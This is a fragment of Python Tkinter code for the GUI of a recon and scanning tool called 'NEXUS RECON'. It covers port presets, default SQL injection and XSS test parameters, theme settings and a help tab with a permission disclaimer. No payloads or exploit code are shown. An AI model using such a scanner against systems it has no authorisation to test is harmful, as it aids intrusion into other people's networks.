        style.configure('TCheckbutton', background=THEME['frame_bg'], foreground=THEME['fg'], font=('Consolas', 9))
        style.configure('TRadiobutton', background=THEME['frame_bg'], foreground=THEME['fg'], font=('Consolas', 9))
        
        # Labelframe styles
        style.configure('TLabelframe', background=THEME['frame_bg'], foreground=THEME['fg'], bordercolor=THEME['border'])
        style.configure('TLabelframe.Label', background=THEME['frame_bg'], foreground=THEME['accent'], font=('Consolas', 10, 'bold'))
        
        # Progressbar style
        style.configure('Custom.Horizontal.TProgressbar',
                      troughcolor=THEME['bg'],
                      background=THEME['accent'],
                      lightcolor=THEME['highlight'],
                      darkcolor=THEME['secondary'],
                      bordercolor=THEME['border'],
                      troughrelief='flat',
                      borderwidth=1)
        
        # Tooltip style (defined in ToolTip class, but ensure TFrame is configured)
        style.configure('Tooltip.TFrame', background=THEME['frame_bg'], relief='solid', borderwidth=1, bordercolor=THEME['accent'])
        style.configure('Tooltip.TLabel', background=THEME['frame_bg'], foreground=THEME['fg'], font=('Consolas', 9))

        # Title Label for the banner
        style.configure('Title.TLabel', background=THEME['bg'], foreground=THEME['fg'], font=('Consolas', 28, 'bold'))
        style.configure('Header.TFrame', background=THEME['bg']) # For the header frame itself

    def setup_ui(self):
        """Sets up the main user interface layout and widgets."""
        try:
            print("Initializing main UI components...")
            
            # Initialize the main container
            self.main_container = ttk.Frame(self.root, padding="10", style='TFrame')
            self.main_container.pack(fill=tk.BOTH, expand=True)
            
            # Create header with title. Placed here to ensure it's above the tabs.
            self.header_frame = ttk.Frame(self.main_container, style='Header.TFrame')
            self.header_frame.pack(fill='x', padx=0, pady=0)
            
            title_label = ttk.Label(
                self.header_frame,
                text="NEXUS RECON",
                style='Title.TLabel',
                padding=(20, 10, 20, 10),
                background=THEME['bg'],
                foreground=THEME['accent'] # Ensure it uses accent color
            )
            title_label.pack(side=tk.TOP, expand=True, fill='x')
            
            version_label = ttk.Label(
                self.header_frame,
                text=f"v{VERSION}",
                font=('Consolas', 10, 'bold'),
                foreground='#666666',
                background=THEME['bg'],
                padding=(10, 0, 0, 5)
            )
            version_label.pack(side=tk.TOP, anchor='e', padx=10) # Aligned to right under title

            # Initialize tab control
            self.tab_control = ttk.Notebook(self.main_container)
            self.tab_control.pack(expand=1, fill=tk.BOTH, pady=(5,0)) # Add some padding from header
            
            # Create tabs
            self.scan_tab = ttk.Frame(self.tab_control, style='TFrame')
            self.results_tab = ttk.Frame(self.tab_control, style='TFrame')
            self.help_tab = ttk.Frame(self.tab_control, style='TFrame')
            self.settings_tab = ttk.Frame(self.tab_control, style='TFrame') # New settings tab
            
            # Add tabs to notebook
            self.tab_control.add(self.scan_tab, text='Scanner')
            self.tab_control.add(self.results_tab, text='Results')
            self.tab_control.add(self.settings_tab, text='Settings') # Add settings tab
            self.tab_control.add(self.help_tab, text='Help')
            
            # Set up tab content - setup results tab first to ensure status_var is initialized
            self._setup_results_tab()
            self._setup_scan_tab()
            self._setup_settings_tab() # Setup settings tab
            self._setup_help_tab()
            
            print("UI initialization complete.")
            
        except Exception as e:
            error_msg = f"Failed to initialize UI: {str(e)}\n\n{str(traceback.format_exc())}"
            messagebox.showerror("UI Initialization Error", error_msg)
            print(error_msg)
            raise

    def _setup_scan_tab(self):
        """Sets up the Network Scanner tab content."""
        main_frame = ttk.Frame(self.scan_tab, style='TFrame')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Target input frame
        target_frame = ttk.LabelFrame(main_frame, text="TARGET", padding=10)
        target_frame.pack(fill=X, padx=5, pady=5)
        
        ttk.Label(target_frame, text="Target:", font=('Consolas', 10, 'bold')).grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.target_entry = ttk.Entry(target_frame, width=60, font=('Consolas', 10))
        self.target_entry.grid(row=0, column=1, padx=5, pady=5, sticky=tk.EW)
        self.target_entry.focus()
        self.add_tooltip(self.target_entry, "Enter the target IP, domain, email, or URL (e.g., target-domain.com, 192.168.1.1, noreply@localhost.invalid, https://target-domain.com/login.php)")
        
        # Scan Type Selection
        scan_type_frame = ttk.Frame(target_frame)
        scan_type_frame.grid(row=0, column=2, columnspan=2, padx=5, pady=5, sticky=tk.EW)
        
        ttk.Label(scan_type_frame, text="SCAN TYPE:", font=('Consolas', 9, 'bold'),
                  foreground=THEME['accent']).pack(side=LEFT, padx=(0, 5))
        
        self.scan_type_var = StringVar()
        self.scan_type_var.set("Port Scan") # Default value
        self.scan_type = ttk.Combobox(
            scan_type_frame, textvariable=self.scan_type_var,
            values=["Port Scan", "WHOIS Lookup", "DNS Lookup", "HTTP Headers", 
                    "Email Verification", "Subdomain Enumeration", "IP Geolocation", 
                    "Vulnerability Scan", "SQL Injection Scan", "XSS Scan"],
            state="readonly", width=28, font=('Consolas', 10, 'bold'), style='TCombobox', takefocus=0
        )
        self.scan_type.pack(side=LEFT)
        self.scan_type.bind('<<ComboboxSelected>>', self.on_scan_type_change)
        self.add_tooltip(self.scan_type, "Select the type of reconnaissance or scan to perform.")
        
        # Advanced Options Frame
        options_frame = ttk.LabelFrame(main_frame, text="ADVANCED SCAN OPTIONS", padding=10)
        options_frame.pack(fill=X, padx=5, pady=5, ipady=5)
        
        # Port Configuration Section
        self.ports_frame = ttk.LabelFrame(options_frame, text="PORT CONFIGURATION", padding=5) # Made self.ports_frame
        self.ports_frame.grid(row=0, column=0, padx=5, pady=2, sticky=tk.N+tk.S+tk.E+tk.W)
        
        ttk.Label(self.ports_frame, text="Port Ranges:", font=('Consolas', 9, 'bold'), 
                 foreground=THEME['accent']).grid(row=0, column=0, sticky=tk.W, padx=2, pady=2)
        self.ports_entry = ttk.Entry(self.ports_frame, width=35, font=('Consolas', 9))
        self.ports_entry.grid(row=0, column=1, padx=5, pady=2, sticky=tk.W)
        self.ports_entry.insert(0, "80,443,21-25,53,110,143,993,995,3306,3389,8080")
        self.add_tooltip(self.ports_entry, "Specify ports (e.g., 80,443) or ranges (e.g., 1-1024).")
        
        common_ports_frame = ttk.Frame(self.ports_frame)
        common_ports_frame.grid(row=1, column=0, columnspan=2, pady=(5,0), sticky=tk.W)
        
        common_ports_presets = [
            ("Top 20", "21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443"),
            ("Web", "80,443,8080,8443,8081"),
            ("Database", "1433,3306,5432"),
            ("All (Slow)", "1-65535")
        ]
        
        for i, (text, ports_str) in enumerate(common_ports_presets):
            btn = ttk.Button(common_ports_frame, text=text, 
                          command=lambda p=ports_str: self.ports_entry.delete(0, END) or self.ports_entry.insert(0, p),
                          style='TButton', width=10)
            btn.pack(side=LEFT, padx=2, pady=2)
            self.add_tooltip(btn, f"Set ports to {text} preset.")

        # Scan Specific Options Frame
        self.scan_options_frame = ttk.LabelFrame(options_frame, text="SCAN SPECIFIC OPTIONS", padding=5)
        self.scan_options_frame.grid(row=1, column=0, padx=5, pady=5, sticky=tk.EW, columnspan=3) # Span all columns

        # Default options (for when no specific scan type is selected)
        self.default_options_frame = ttk.Frame(self.scan_options_frame)
        ttk.Label(self.default_options_frame, text="No specific options for this scan type.", foreground=THEME['info'], font=('Consolas', 9)).pack(padx=5, pady=5)
        
        # SQL Injection Scan Options
        self.sqli_options_frame = ttk.Frame(self.scan_options_frame)
        ttk.Label(self.sqli_options_frame, text="Parameters to Test:", font=('Consolas', 9, 'bold')).pack(side=tk.LEFT, padx=5)
        self.sqli_params_entry = ttk.Entry(self.sqli_options_frame, width=40, font=('Consolas', 9))
        self.sqli_params_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        self.sqli_params_entry.insert(0, "id,user,username,email,search,query")
        self.add_tooltip(self.sqli_params_entry, "Comma-separated list of URL/form parameters to test for SQL injection (e.g., 'id,search')")
        
        # XSS Scan Options
        self.xss_options_frame = ttk.Frame(self.scan_options_frame)
        ttk.Label(self.xss_options_frame, text="Parameters to Test:", font=('Consolas', 9, 'bold')).pack(side=tk.LEFT, padx=5)
        self.xss_params_entry = ttk.Entry(self.xss_options_frame, width=40, font=('Consolas', 9))
        self.xss_params_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        self.xss_params_entry.insert(0, "q,search,query,term,keywords")
        self.add_tooltip(self.xss_params_entry, "Comma-separated list of URL/form parameters to test for XSS (e.g., 'q,name')")
        
        # Performance Section
        perf_frame = ttk.LabelFrame(options_frame, text="PERFORMANCE", padding=5)
        perf_frame.grid(row=0, column=1, padx=5, pady=2, sticky=tk.N+tk.S+tk.E+tk.W)
        
        ttk.Label(perf_frame, text="Threads:", font=('Consolas', 9)).grid(row=0, column=0, sticky=tk.W, padx=2, pady=2)
        self.threads_var = StringVar(value="100")
        self.threads_slider = ttk.Scale(perf_frame, from_=1, to=200, orient=tk.HORIZONTAL,
                                      variable=self.threads_var, command=lambda v: self.threads_var.set(str(int(float(v)))))
        self.threads_slider.grid(row=0, column=1, padx=5, pady=2, sticky=tk.EW)
        self.add_tooltip(self.threads_slider, "Number of concurrent threads for scanning (higher = faster, but more resource intensive).")
        
        ttk.Label(perf_frame, text="Timeout (s):", font=('Consolas', 9)).grid(row=1, column=0, sticky=tk.W, padx=2, pady=2)
        self.timeout_var = StringVar(value="10") # Default to 10 seconds timeout
        self.timeout_slider = ttk.Scale(perf_frame, from_=1, to=30, orient=tk.HORIZONTAL,
                                      variable=self.timeout_var, command=lambda v: self.timeout_var.set(str(int(float(v)))))
        self.timeout_slider.grid(row=1, column=1, padx=5, pady=2, sticky=tk.EW)
        self.add_tooltip(self.timeout_slider, "Maximum time in seconds to wait for a response from a target.")
        
        # Scan Options Section (General flags)
        opts_frame = ttk.LabelFrame(options_frame, text="GENERAL SCAN FLAGS", padding=5)
        opts_frame.grid(row=0, column=2, padx=5, pady=2, sticky=tk.N+tk.S+tk.E+tk.W)
        
        self.opt_vars = {}
        scan_opts = [
            ("Aggressive Mode", "aggressive_mode", False, "Enable more aggressive detection (may be noisy or trigger WAF/IPS)."),
            ("Ping Host First", "ping_first", True, "Ping host to check if it's online before detailed scanning."),
            ("Follow HTTP Redirects", "follow_redirects", True, "Automatically follow HTTP 3xx redirects during web scans.")
        ]
        
        for i, (text, var_name, default, tooltip_text) in enumerate(scan_opts):
            self.opt_vars[var_name] = tk.BooleanVar(value=default)
            cb = ttk.Checkbutton(opts_frame, text=text, variable=self.opt_vars[var_name], style='TCheckbutton')
            # Store the checkbox widget for later state changes
            setattr(self, f'{var_name}_cb', cb) 
            cb.grid(row=i, column=0, sticky=tk.W, padx=5, pady=1) # One column for simplicity
            self.add_tooltip(cb, tooltip_text)
        
        # Configure grid weights for responsive layout
        options_frame.columnconfigure(0, weight=1)
        options_frame.columnconfigure(1, weight=1)
        options_frame.columnconfigure(2, weight=1)
        perf_frame.columnconfigure(1, weight=1)
        target_frame.columnconfigure(1, weight=1)
        
        # Action Buttons
        button_frame = ttk.Frame(main_frame, style='TFrame')
        button_frame.pack(fill=X, pady=(10, 5), padx=5)
        
        self.start_btn = ttk.Button(button_frame, text="▶ START SCAN", command=self.start_scan, style='TButton')
        self.start_btn.pack(side=LEFT, padx=5)
        self.add_tooltip(self.start_btn, "Initiate the selected scan with the configured options.")
        
        self.stop_btn = ttk.Button(button_frame, text="⏹ STOP", command=self.stop_scan, style='TButton', state=DISABLED)
        self.stop_btn.pack(side=LEFT, padx=5)
        self.add_tooltip(self.stop_btn, "Halt the currently running scan.")
        
        self.clear_btn = ttk.Button(button_frame, text="🗑 CLEAR OUTPUT", command=self.clear_output, style='TButton')
        self.clear_btn.pack(side=LEFT, padx=5)
        self.add_tooltip(self.clear_btn, "Clear all text from the scan results area.")

        self.export_btn = ttk.Button(button_frame, text="💾 EXPORT RESULTS", command=self.export_results, style='TButton')
        self.export_btn.pack(side=RIGHT, padx=5)
        self.add_tooltip(self.export_btn, "Save the current scan results to a file.")
        
        # Initialize status_var for status messages
        self.status_var = StringVar()
        status_label = ttk.Label(button_frame, textvariable=self.status_var, font=('Consolas', 9), 
                               foreground=THEME['accent'])
        status_label.pack(side=LEFT, padx=10, expand=True, fill=X)
        
        self.on_scan_type_change() # Initialize UI based on default scan type

    def _setup_results_tab(self):
        """Sets up the Results tab content."""
        results_frame = ttk.Frame(self.results_tab, style='TFrame')
        results_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Text area for displaying scan results
        self.text_area = scrolledtext.ScrolledText(
            results_frame,
            wrap=tk.WORD,
            width=80,
            height=20,
            bg=THEME['terminal_bg'],
            fg=THEME['terminal_fg'],
            insertbackground=THEME['fg'],
            selectbackground=THEME['select_bg'],
            selectforeground=THEME['select_fg'],
            font=('Consolas', 10),
            padx=5,
            pady=5
        )
        self.text_area.pack(fill=tk.BOTH, expand=True)
        self.text_area.config(state=tk.DISABLED)  # Read-only initially
        
        # Status Bar at the bottom
        status_bar = ttk.Frame(self.results_tab, relief=tk.SUNKEN, borderwidth=1, style='TFrame')
        status_bar.pack(fill=tk.X, pady=(5, 0), ipady=3)
        
        self.status_var_results = tk.StringVar() # Separate status var for results tab
        self.status_var_results.set(" READY | No Scan Running")
        status_label = ttk.Label(
            status_bar,
            textvariable=self.status_var_results,
            anchor=tk.W,
            font=('Consolas', 9),
            foreground=THEME['fg'],
            background=THEME['frame_bg']
        )
        status_label.pack(fill=tk.X, ipady=2)
        
        # Initialize the progress bar in the results tab
        progress_frame = ttk.Frame(self.results_tab, style='TFrame')
        progress_frame.pack(fill=tk.X, padx=5, pady=(0, 5))
        
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(
            progress_frame, 
            variable=self.progress_var, 
            maximum=100, 
            mode='determinate',
            style='Custom.Horizontal.TProgressbar', 
            length=100
        )
        self.progress_bar.pack(side=LEFT, fill=tk.X, expand=True)
        
        self.progress_text_var = tk.StringVar(value="Ready")
        ttk.Label(
            progress_frame, 
            textvariable=self.progress_text_var, 
            foreground=THEME['accent'],
            font=('Consolas', 9)
        ).pack(side=RIGHT, padx=5)
            
        print("Results tab setup complete.")

    def _setup_settings_tab(self):
        """Sets up the widgets for the 'SETTINGS' tab."""
        settings_frame = ttk.Frame(self.settings_tab, padding=15, style='TFrame')
        settings_frame.pack(fill=BOTH, expand=True)
        
        ttk.Label(settings_frame, text="Application Settings", font=('Consolas', 12, 'bold'),
                 foreground=THEME['accent']).pack(anchor=tk.W, pady=(0, 10))
        
        # Theme Settings
        theme_options_frame = ttk.LabelFrame(settings_frame, text="THEME SELECTION", padding=10)
        theme_options_frame.pack(fill=X, pady=10)
        
        self.theme_var = StringVar(value="Matrix")
        themes = ["Matrix", "Dark", "Hacker", "Light"]
        
        for theme in themes:
            rb = ttk.Radiobutton(theme_options_frame, text=theme, variable=self.theme_var, value=theme,
                                 command=self.change_theme, style='TRadiobutton')
            rb.pack(side=LEFT, padx=10, pady=5)
            self.add_tooltip(rb, f"Switch to {theme} color theme.")

        # Default Timeout for NetworkRecon operations
        general_settings_frame = ttk.LabelFrame(settings_frame, text="GENERAL SETTINGS", padding=10)
        general_settings_frame.pack(fill=X, pady=10)

        ttk.Label(general_settings_frame, text="Default Network Timeout (s):", font=('Consolas', 10)).grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.recon_timeout_var = StringVar(value=str(self.recon.timeout))
        timeout_entry = ttk.Entry(general_settings_frame, textvariable=self.recon_timeout_var, width=10, font=('Consolas', 10))
        timeout_entry.grid(row=0, column=1, sticky=tk.W, padx=5, pady=5)
        self.add_tooltip(timeout_entry, "Set a global default timeout for all network operations performed by the tool.")
        
        save_btn = ttk.Button(settings_frame, text="APPLY SETTINGS", command=self.save_settings, style='TButton')
        save_btn.pack(pady=10)
        self.add_tooltip(save_btn, "Apply the current settings (e.g., default timeout).")

    def save_settings(self):
        """Saves current settings (e.g., default timeout) and applies them."""
        try:
            new_timeout = int(self.recon_timeout_var.get())
            if new_timeout > 0:
                self.recon.timeout = new_timeout
                self.log(f"[+] Default network timeout set to {new_timeout} seconds.", "green")
                messagebox.showinfo("Settings Applied", f"Default network timeout updated to {new_timeout} seconds.")
            else:
                messagebox.showwarning("Invalid Input", "Timeout must be a positive integer.")
        except ValueError:
            messagebox.showwarning("Invalid Input", "Timeout must be a number.")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save settings: {str(e)}")

    def change_theme(self):
        """Changes the application's visual theme based on user selection."""
        theme_name = self.theme_var.get()
        current_theme_settings = {}

        if theme_name == "Matrix":
            current_theme_settings = {
                'bg': '#000000', 'fg': '#00ff00', 'accent': '#00ff00', 'secondary': '#003300',
                'text': '#00ff00', 'entry_bg': '#0a0a0a', 'entry_fg': '#00ff00',
                'button_bg': '#001a00', 'button_fg': '#00ff00', 'button_active': '#004d00',
                'highlight': '#00cc00', 'terminal_bg': '#000000', 'terminal_fg': '#00ff00',
                'success': '#00ff00', 'warning': '#ffff00', 'error': '#ff0000',
                'info': '#00ffff', 'frame_bg': '#0a0a0a', 'border': '#004d00',
                'select_bg': '#002200', 'select_fg': '#ffffff'
            }
        elif theme_name == "Dark":
            current_theme_settings = {
                'bg': '#1e1e1e', 'fg': '#f0f0f0', 'accent': '#bb86fc', 'secondary': '#333333',
                'text': '#f0f0f0', 'entry_bg': '#2a2a2a', 'entry_fg': '#f0f0f0',
                'button_bg': '#3700b3', 'button_fg': '#ffffff', 'button_active': '#6200ee',
                'highlight': '#03dac6', 'terminal_bg': '#282828', 'terminal_fg': '#cccccc',
                'success': '#00c853', 'warning': '#ffc107', 'error': '#f44336',
                'info': '#2196f3', 'frame_bg': '#2a2a2a', 'border': '#424242',
                'select_bg': '#555555', 'select_fg': '#ffffff'
            }
        elif theme_name == "Hacker":
            current_theme_settings = {
                'bg': '#0a0a0a', 'fg': '#33ff33', 'accent': '#ff6600', 'secondary': '#1a1a1a',
                'text': '#33ff33', 'entry_bg': '#0f0f0f', 'entry_fg': '#33ff33',
                'button_bg': '#222222', 'button_fg': '#ff6600', 'button_active': '#333333',
                'highlight': '#ccff00', 'terminal_bg': '#0a0a0a', 'terminal_fg': '#33ff33',
                'success': '#66cc66', 'warning': '#ffcc00', 'error': '#ff3333',
                'info': '#6699ff', 'frame_bg': '#121212', 'border': '#444444',
                'select_bg': '#222222', 'select_fg': '#ff6600'
            }
        elif theme_name == "Light":
             current_theme_settings = {
                'bg': '#f0f0f0', 'fg': '#333333', 'accent': '#007bff', 'secondary': '#e0e0e0',
                'text': '#333333', 'entry_bg': '#ffffff', 'entry_fg': '#333333',
                'button_bg': '#007bff', 'button_fg': '#ffffff', 'button_active': '#0056b3',
                'highlight': '#0056b3', 'terminal_bg': '#ffffff', 'terminal_fg': '#333333',
                'success': '#28a745', 'warning': '#ffc107', 'error': '#dc3545',
                'info': '#17a2b8', 'frame_bg': '#ffffff', 'border': '#cccccc',
                'select_bg': '#e9ecef', 'select_fg': '#333333'
            }

        # Update global THEME dictionary
        THEME.update(current_theme_settings)
        
        # Re-apply all styles
        self.setup_styles()
        
        # Manually update specific widget colors that don't pick up style changes automatically
        self.root.configure(background=THEME['bg'])
        # Update text area and progress bar
        self.text_area.configure(bg=THEME['terminal_bg'], fg=THEME['terminal_fg'], insertbackground=THEME['fg'],
                                 selectbackground=THEME['select_bg'], selectforeground=THEME['select_fg'])
        # The progress bar style itself is updated by setup_styles
        
        # Recursively update colors for all children widgets that don't auto-update via ttk style
        def update_frame_colors(frame):
            if not hasattr(frame, 'winfo_children'):
                return

            try:
                # Attempt to configure background if the widget supports it
                frame.configure(background=THEME['frame_bg'])
            except tk.TclError:
                pass # Ignore if widget doesn't have 'background' or it's managed by style

            for child in frame.winfo_children():
                if not hasattr(child, 'winfo_class'):
                    continue

                if isinstance(child, (ttk.Frame, ttk.LabelFrame)):
                    update_frame_colors(child) # Recursive call for frames
                elif isinstance(child, (ttk.Label, ttk.Checkbutton, ttk.Radiobutton)):
                    try:
                        child.config(background=THEME['frame_bg'], foreground=THEME['fg'])
                    except tk.TclError:
                        pass # Some ttk widgets' colors are fully controlled by style
                elif isinstance(child, (ttk.Entry)):
                    try:
                        child.config(fieldbackground=THEME['entry_bg'], foreground=THEME['entry_fg'], insertbackground=THEME['accent'])
                    except tk.TclError:
                        pass
                elif isinstance(child, (ttk.Combobox)):
                    try:
                        child.config(fieldbackground=THEME['entry_bg'], foreground=THEME['entry_fg'], 
                                     selectbackground=THEME['select_bg'], selectforeground=THEME['select_fg'], 
                                     arrowcolor=THEME['fg'])
                    except tk.TclError:
                        pass

        # Apply to main containers and their children
        update_frame_colors(self.main_container) 
        self.root.update_idletasks() # Force GUI update

    def _setup_help_tab(self):
        """Sets up the help tab with usage instructions and troubleshooting tips."""
        canvas = tk.Canvas(self.help_tab, bg=THEME['bg'], highlightthickness=0)
        scrollbar = ttk.Scrollbar(self.help_tab, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas, style='TFrame') # Use TFrame style for consistent background

        scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))

        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw", width=950) # Set width for content
        canvas.pack(side=LEFT, fill=BOTH, expand=True)
        scrollbar.pack(side=RIGHT, fill=Y)

        help_content = [
            ("NEXUS RECON TOOL - Help Guide", "h1"),
            ("This tool provides various network scanning and OSINT (Open Source Intelligence) capabilities. Always ensure you have explicit permission to scan any target network or system.", "p"),
            
            ("Scan Types Overview", "h2"),
            ("1. Port Scan:", "h3"),
            ("Scans for open TCP ports on a target IP or domain. Useful for identifying active services.", "p"),
            ("   Example: Scan common ports on target-domain.com", "code"),
            ("   Target: target-domain.com (or 192.168.1.1)", "p"),
            ("   Ports: 80,443,21-25 (customizable ranges)", "p"),
            
            ("2. WHOIS Lookup:", "h3"),
            ("Retrieves domain registration information (owner, registrar, creation/expiry dates).", "p"),
            ("   Example: Get WHOIS data for target-domain.com", "code"),
            ("   Target: target-domain.com", "p"),
            
            ("3. DNS Lookup:", "h3"),
            ("Fetches various DNS records (A, AAAA, MX, NS, TXT, etc.) for a domain. Essential for understanding domain infrastructure.", "p"),
            ("   Example: Lookup all DNS records for target-domain.com", "code"),
            ("   Target: target-domain.com", "p"),
            
            ("4. HTTP Headers:", "h3"),
            ("Analyzes HTTP response headers for security best practices (e.g., HSTS, CSP, X-Frame-Options) and information disclosure.", "p"),
            ("   Example: Check headers for target-domain.com", "code"),
            ("   Target: target-domain.com (or https://target-domain.com/)", "p"),
            
            ("5. Email Verification:", "h3"),
            ("Checks email existence via MX records and SMTP, and performs basic searches for public social media profiles associated with the email's username.", "p"),
            ("   Example: Verify info for noreply@localhost.invalid", "code"),
            ("   Target: noreply@localhost.invalid", "p"),
            
            ("6. Subdomain Enumeration:", "h3"),
            ("Discovers active subdomains for a given domain using common wordlists and DNS resolution.", "p"),
            ("   Example: Find subdomains of target-domain.com", "code"),
            ("   Target: target-domain.com", "p"),
            
            ("7. IP Geolocation:", "h3"),
            ("Retrieves geographical location details for an IP address or domain (which will be resolved to an IP).", "p"),
            ("   Example: Get location of 8.8.8.8", "code"),
            ("   Target: 8.8.8.8 or target-domain.com", "p"),

            ("8. Vulnerability Scan:", "h3"),
            ("Performs comprehensive checks including service version detection, security header analysis, and identification of common web server misconfigurations/files.", "p"),
            ("   Example: Vulnerability scan on a web server", "code"),
            ("   Target: 192.168.1.1 (or a domain)", "p"),
            ("   Ports: 80,443,8080 (or custom ports, for web services and others)", "p"),
            
            ("9. SQL Injection Scan:", "h3"),
            ("Tests web applications for SQL injection vulnerabilities by sending crafted payloads to user-specified URL/form parameters.", "p"),
            ("   Example: Test a web page for SQLi", "code"),
            ("   Target: http://target-domain.com/search.php", "p"),
            ("   Parameters to Test: id,query,category (comma-separated list of parameter names)", "p"),
            
            ("10. XSS Scan:", "h3"),
            ("Tests web applications for Cross-Site Scripting (XSS) vulnerabilities by attempting to inject JavaScript payloads into user-specified URL/form parameters.", "p"),
            ("   Example: Test a web page for XSS", "code"),
            ("   Target: http://target-domain.com/guestbook.php", "p"),
            ("   Parameters to Test: message,name,email (comma-separated list of parameter names)", "p"),

            ("Troubleshooting Tips", "h2"),
            ("• Scan Fails/Times Out:", "li"),
            ("  - Check your internet connection.", "p"),
            ("  - Verify the target is online and accessible.", "p"),
            ("  - Increase the 'Timeout (s)' in Advanced Scan Options.", "p"),
            ("  - The target's firewall or network security might be blocking scans.", "p"),
            
            ("• No DNS Records Found:", "li"),
            ("  - Ensure the domain name is spelled correctly.", "p"),
            ("  - The domain might not be registered or configured properly.", "p"),
            ("  - Your local DNS resolver might be having issues; try changing your system's DNS settings if persistent.", "p"),
            
            ("• GUI Becomes Unresponsive:", "li"),
            ("  - All heavy scans run in a separate thread, but very high thread counts or extensive logging can still impact responsiveness. Reduce 'Threads' if necessary.", "p"),
            ("  - Ensure you have enough system resources (RAM/CPU).", "p"),
            ("  - Use 'Stop Scan' button to halt any running process.", "p"),
            
            ("Keyboard Shortcuts", "h2"),
            ("• Enter: Start scan (when target entry is focused)", "p"),
            ("• Ctrl+S: Export scan results", "p"),
            ("• Ctrl+C: Copy selected text to clipboard", "p"),
            ("• Ctrl+L: Clear output text area", "p"),
            ("• F1: Show this help tab", "p"),
            ("• Escape: Exit the application", "p"),
            
            ("Disclaimer & Responsible Use", "h2"),
            ("This tool is intended for educational purposes, security testing of systems you own, or systems for which you have explicit, written permission from the owner to test.", "p"),
            ("Unauthorized scanning or attacking of networks/systems is illegal and unethical.", "p"),
            ("The developer assumes no liability for any misuse or damage caused by this software.", "p")
        ]
        
        for text, style_type in help_content:
            if style_type == "h1":
                label = ttk.Label(scrollable_frame, text=text, font=('Consolas', 18, 'bold'), foreground=THEME['accent'], background=THEME['frame_bg'])
                label.pack(anchor='w', pady=(15, 8), padx=10)
            elif style_type == "h2":
                label = ttk.Label(scrollable_frame, text=text, font=('Consolas', 14, 'bold'), foreground=THEME['fg'], background=THEME['frame_bg'])
                label.pack(anchor='w', pady=(12, 6), padx=15)
            elif style_type == "h3":
                label = ttk.Label(scrollable_frame, text=text, font=('Consolas', 11, 'bold'), foreground=THEME['info'], background=THEME['frame_bg'])
                label.pack(anchor='w', pady=(8, 4), padx=20)
            elif style_type == "code":
                code_frame = ttk.Frame(scrollable_frame, style='Tooltip.TFrame') # Reusing tooltip frame style for code blocks
                code_label = ttk.Label(code_frame, text=text, font=('Consolas', 9, 'italic'), 
                                       background=THEME['entry_bg'], foreground=THEME['success'], padding=5)
                code_label.pack(fill=X, padx=5, pady=2)
                code_frame.pack(fill=X, padx=25, pady=2)
            elif style_type == "li":
                label = ttk.Label(scrollable_frame, text=f"• {text}", font=('Consolas', 10, 'bold'), foreground=THEME['fg'], background=THEME['frame_bg'])
                label.pack(anchor='w', padx=25, pady=2)
            else: # 'p' for paragraph
                label = ttk.Label(scrollable_frame, text=text, font=('Consolas', 10), wraplength=880, justify='left', foreground=THEME['fg'], background=THEME['frame_bg'])
                label.pack(anchor='w', padx=30, pady=2)
        
        # Ensure scrollable frame fits content
        scrollable_frame.update_idletasks()
        canvas.config(scrollregion=canvas.bbox("all"))

    def log(self, message, color_key='terminal_fg'):
        """
        Adds a message to the scrolled text area with color.
        This method is passed to NetworkRecon for centralized logging.
        """
        self.root.after(0, self._insert_log_message, message, color_key)

    def _insert_log_message(self, message, color_key):
        """Helper to insert log messages safely on the main thread."""
        try:
            self.text_area.config(state=NORMAL)
            
            # Define tags for colors
            colors = {
                'green': THEME['success'],
                'yellow': THEME['warning'],
                'red': THEME['error'],
                'cyan': THEME['info'],
                'terminal_fg': THEME['terminal_fg'], # Default text color
                'info': THEME['info'],
                'high': THEME['error'], # Alias for high severity alerts
                'error': THEME['error'] # Ensure 'error' is explicitly mapped
            }
            
            # Configure tags if not already configured
            if color_key not in self.text_area.tag_names():
                self.text_area.tag_config(color_key, foreground=colors.get(color_key, THEME['terminal_fg']))

            self.text_area.insert(END, f"{message}\n", color_key)
            self.text_area.see(END) # Scroll to the end
            self.text_area.config(state=DISABLED)
            self.root.update_idletasks() # Force GUI update
        except Exception as e:
            print(f"Error logging to GUI: {str(e)}") # Fallback to console

    def clear_output(self):
        """Clears the output text area."""
        self.text_area.config(state=NORMAL)
        self.text_area.delete(1.0, END)
        self.text_area.config(state=DISABLED)
        self.status_var.set(" OUTPUT CLEARED")
        self.status_var_results.set(" OUTPUT CLEARED") # Clear results tab status too
        self.progress_var.set(0) # Reset progress bar
        self.progress_text_var.set("Ready")

    def copy_text(self, event=None):
        """Copies selected text from the text area to the clipboard."""
        try:
            selected = self.text_area.get(SEL_FIRST, SEL_LAST)
            self.root.clipboard_clear()
            self.root.clipboard_append(selected)
            self.status_var.set(" TEXT COPIED TO CLIPBOARD")
            self.status_var_results.set(" TEXT COPIED TO CLIPBOARD")
        except tk.TclError: # No text selected
            self.status_var.set(" NO TEXT SELECTED TO COPY")
            self.status_var_results.set(" NO TEXT SELECTED TO COPY")
        except Exception as e:
            self.log(f"[-] Error copying text: {str(e)}", "red")

    def show_help(self, event=None):
        """Switches to the Help tab."""
        self.tab_control.select(self.help_tab)
        self.status_var.set(" DISPLAYING HELP")
        self.status_var_results.set(" DISPLAYING HELP")

    def on_scan_type_change(self, event=None):
        """Adjusts UI elements based on the selected scan type."""
        selected_scan = self.scan_type_var.get()
        
        # Show/hide port configuration based on scan type
        if "Port Scan" in selected_scan or "Vulnerability Scan" in selected_scan:
            self.ports_frame.grid()
            self.ports_entry.config(state=NORMAL)
            # Enable buttons within common_ports_frame
            for child in self.ports_frame.winfo_children():
                if isinstance(child, ttk.Frame): # This is the common_ports_frame
                    for btn_child in child.winfo_children():
                        if isinstance(btn_child, ttk.Button):
                            btn_child.config(state=NORMAL)
        else:
            self.ports_frame.grid_remove()
            self.ports_entry.config(state=DISABLED)
